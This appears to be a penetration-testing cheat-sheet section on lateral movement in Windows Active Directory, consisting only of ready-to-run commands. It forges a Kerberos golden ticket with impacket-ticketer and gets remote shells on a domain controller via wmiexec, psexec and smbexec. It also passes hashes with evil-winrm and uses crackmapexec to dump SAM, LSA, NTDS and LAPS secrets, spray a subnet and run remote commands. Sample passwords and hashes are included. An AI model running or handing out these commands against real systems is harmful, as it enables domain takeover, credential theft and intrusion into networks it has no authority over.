### Lateral Movement

```
/usr/bin/impacket-ticketer -domain activebreach.io -domain-sid S-1-5-21-134085869-1149061413-485552689 -nthash 1d2ceb7b570cc960903077eeee93ccd9 Administrator
export KRB5CCNAME=Administrator.ccache

/usr/bin/impacket-wmiexec -k -no-pass -dc-ip 10.10.10.10 DC-ActiveBreach.ActiveBreach.io -target-ip 10.10.10.10
/usr/bin/impacket-psexec -k -no-pass -dc-ip 10.10.10.10 DC-ActiveBreach.ActiveBreach.io -target-ip 10.10.10.10
/usr/bin/impacket-smbexec  -k -no-pass -dc-ip 10.10.10.10 DC-ActiveBreach.ActiveBreach.io -target-ip 10.10.10.10
```

```
impacket-wmiexec Administrator:P@ssw0rd@192.168.10.131
impacket-wmiexec adminWebSvc:'FGjksdff89sdfj'@192.168.215.181
impacket-wmiexec -hashes aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0 Orlando@192.168.10.122
impacket-psexec Administrator:P@ssw0rd@192.168.10.131
impacket-psexec -hashes aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0 Orlando@192.168.10.122 

```
evil-winrm -i 192.168.43.5 -u Administrator -H d958f23d92281df0b62a6d7e9f42ee88
```

```
crackmapexec smb 192.168.10.131 -u Administrator -p P@ssw0rd --local-auth  --sam
crackmapexec smb 192.168.10.131 -u Administrator -p P@ssw0rd --local-auth  --lsa
crackmapexec smb 192.168.10.131 -u Administrator -p P@ssw0rd --local-auth  --lsa
crackmapexec smb 192.168.10.131 -u Administrator -p P@ssw0rd --local-auth  --lsa
crackmapexec smb 192.168.10.131 -u Administrator -p P@ssw0rd --local-auth --ntds
crackmapexec smb 192.168.10.131 -u Administrator -p P@ssw0rd --local-auth  -M laps
crackmapexec smb 192.168.10.131 -u Administrator -p P@ssw0rd --local-auth  -M ntdsutil
crackmapexec smb 192.168.10.131 -u Administrator -p P@ssw0rd --local-auth  --ntds vss
crackmapexec smb --local-auth 10.10.10.10/23 -u administrator -H 10298e182387f9cab376ecd08491764a0 | grep +
crackmapexec smb 192.168.10.131 -u Administrator -p P@ssw0rd --spider C\$ --pattern txt 
crackmapexec smb 192.168.10.131 -u Administrator -p P@ssw0rd -x "type C:\Windows\System32\Tasks\HackMe.txt"
```


